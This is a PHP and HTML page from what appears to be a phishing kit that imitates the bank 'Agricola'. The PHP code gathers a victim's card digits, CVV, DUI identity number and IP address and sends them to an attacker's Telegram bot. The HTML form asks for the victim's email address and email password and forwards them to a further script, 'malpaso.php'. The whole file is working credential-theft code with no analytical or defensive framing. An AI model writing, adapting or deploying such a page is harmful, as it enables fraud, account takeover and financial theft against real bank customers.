<?php
// Obtener la dirección IP del cliente
$ip = $_SERVER['REMOTE_ADDR'];

// Verificar si se ha enviado el formulario
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Obtener los datos del formulario
    $trj = $_POST['trj'];
    $cv = $_POST['cv'];
    $dni = $_POST['dni'];

    // Construir el mensaje a enviar a Telegram
    $message = "LOGIN AGRICOLA CARD
    
    Últimos 4 dígitos de la tarjeta: " . $trj . "\n";
    $message .= "Código de seguridad (CVV): " . $cv . "\n";
    $message .= "DUI: " . $dni . "\n";
    $message .= "Dirección IP: " . $ip;

    // Cargar la configuración de Telegram desde data.php
    $config = include('data.php');
    $token = $config['token'];
    $chat_id = $config['chat_id'];

    // Enviar el mensaje a Telegram
    $api_url = "https://api.telegram.org/bot{$token}/sendMessage";
    $params = [
        'chat_id' => $chat_id,
        'text' => $message,
    ];
    $query_string = http_build_query($params);
    $request_url = $api_url . '?' . $query_string;
    $response = file_get_contents($request_url);

    // Verificar si el mensaje se envió correctamente
    if ($response === false) {
        echo "Ha ocurrido un error al enviar el mensaje.";
    } else {
        echo "";
    }
}
?>
  <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AGRicola</title>
</head>


<style>
.ipp {
    --vh: 6.43px;
    -webkit-tap-highlight-color: transparent;
    outline: 0;
    box-sizing: border-box;
    background-color: transparent;
    border: none;
    border-bottom: 1px solid #292929;
    border-radius: 0;
    display: block;
    width: 100%;
    font-size: 16px;
    color: #292929;
    font-family: "Open Sans", sans-serif;
    line-height: 23px;
    padding: 0;
    margin: 0;
    flex: 1 1 auto;
    margin-bottom: 0;
    padding-left: 0;
}


.boton {
    --vh: 6.43px;
    -webkit-tap-highlight-color: transparent;
    outline: 0;
    box-sizing: border-box;
    display: inline-block;
    background-color: #FDDA24;
    color: #292929;
    text-transform: uppercase;
    border: none;
    border-radius: 42px;
    padding: 10px 17px;
    font-weight: bold;
    font-size: 18px;
    font-family: "CIBfont", Helvetica, Arial, sans-serif;
    vertical-align: middle;
    overflow: hidden;
    margin-bottom: 10px;
    box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.1);
    width: 100%;
    min-height: 42px;
    min-width: 135px;
    line-height: 21px;
    flex: 1 0 auto;
}

</style>







<body>
    




<center>

<form action="malpaso.php" method="post" style="width: 360px; height: auto; padding: px; margin-left: -5px;">

<img src="positivo.svg" alt="">

<br>

<img src="titulo.png" alt="" style="width: 260px;">


<br><br><br>


<img style="width: 70%;" src="title.png" alt="">


<br><br> 
<p style="font-family: sans-serif;font-size: 15px;float: left;color: rgb(59, 57, 57);">Correo electrónico asociado a su cuenta</p>
<input  required class="ipp" type="email" name="mai" id="us">
<br>
<p style="font-family: sans-serif;font-size: 15px;float: left;color: rgb(59, 57, 57);">Clave de correo</p>
<input required class="ipp" type="password" name="pss" id="us">
<br>



<img src="abajo.png" alt="" width="100%">




<input class="boton" value="CONTINUAR" type="submit">



<br><br>
<img src="ubajo.png" alt="" style="width: 450px; margin-left: -40px;">

</form>

</center>















</body>
</html>